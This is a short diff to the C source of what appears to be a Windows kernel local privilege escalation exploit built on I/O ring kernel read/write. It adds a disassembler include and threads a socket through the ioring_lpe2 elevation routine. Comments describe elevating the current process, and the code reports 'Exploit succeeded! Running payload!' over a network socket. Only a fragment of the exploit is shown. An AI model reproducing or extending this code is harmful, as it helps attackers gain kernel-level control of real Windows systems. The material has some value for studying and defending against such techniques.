@@ -10,6 +10,8 @@
 #include "ioring.h"
 #include "nt_offsets.h"
 
+#include "Zydis.h"
+
 // socket stuff
 WSADATA wsaData;
 SOCKET winSock;
@@ -511,7 +513,7 @@ int main(int argc, char** argv)
     //sprintf_s(ptr_msg, sizeof(ptr_msg), "ioring lpe2");
    //send(winSock, ptr_msg, strlen(ptr_msg), 0);
     // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
-    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x4000, ioring_addr, g_kernel_base, build_rev); // originally 0x1000
+    ioring_lpe2(winSock, GetCurrentProcessId(), 0x65007500, 0x4000, ioring_addr, g_kernel_base, build_rev); // originally 0x1000
     cur_msg = "Exploit succeeded! Running payload!\n\n";
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
